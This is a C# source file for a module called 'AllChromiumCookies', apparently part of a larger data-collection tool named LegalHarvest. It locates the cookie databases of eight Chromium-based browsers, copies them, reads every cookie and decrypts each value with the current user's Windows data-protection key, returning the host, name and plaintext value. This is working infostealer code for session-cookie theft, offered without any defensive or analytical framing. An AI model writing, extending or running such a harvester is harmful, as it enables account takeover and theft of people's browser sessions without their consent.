using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace LegalHarvest.Modules
{
    public class AllChromiumBrowsersCookiesModule : ICollectorModule
    {
        public string ModuleName => "AllChromiumCookies";

        private readonly List<(string Name, string RelativePath)> browsers = new List<(string, string)>
        {
            ("Chrome", @"Google\Chrome\User Data"),
            ("Edge", @"Microsoft\Edge\User Data"),
            ("Brave", @"BraveSoftware\Brave-Browser\User Data"),
            ("Opera", @"Opera Software\Opera Stable"),
            ("Opera GX", @"Opera Software\Opera GX Stable"),
            ("Vivaldi", @"Vivaldi\User Data"),
            ("Yandex", @"Yandex\YandexBrowser\User Data"),
            ("Chromium", @"Chromium\User Data")
        };

        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            foreach (var browser in browsers)
            {
                string basePath = Path.Combine(localAppData, browser.RelativePath);
                if (!Directory.Exists(basePath)) continue;

                foreach (string profileDir in Directory.GetDirectories(basePath, "*", SearchOption.TopDirectoryOnly))
                {
                    string cookieDb = Path.Combine(profileDir, "Cookies");
                    if (!File.Exists(cookieDb)) continue;

                    string tempDb = Path.GetTempFileName();
                    File.Copy(cookieDb, tempDb, true);
                    try
                    {
                        using (var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;"))
                        {
                            conn.Open();
                            string query = "SELECT host_key, name, encrypted_value FROM cookies";
                            using (var cmd = new SQLiteCommand(query, conn))
                            using (var reader = cmd.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    string host = reader["host_key"].ToString();
                                    string name = reader["name"].ToString();
                                    byte[] encryptedValue = (byte[])reader["encrypted_value"];
                                    string value = "";
                                    try
                                    {
                                        byte[] decrypted = ProtectedData.Unprotect(encryptedValue, null, DataProtectionScope.CurrentUser);
                                        value = Encoding.UTF8.GetString(decrypted);
                                    }
                                    catch { value = "[DECRYPT_FAILED]"; }
                                    items.Add(new CollectedItem { Category = $"{browser.Name}Cookies", Name = host, Value = $"{name}={value}", Timestamp = DateTime.Now });
                                }
                            }
                        }
                    }
                    finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
                }
            }
            return items;
        }
    }
}
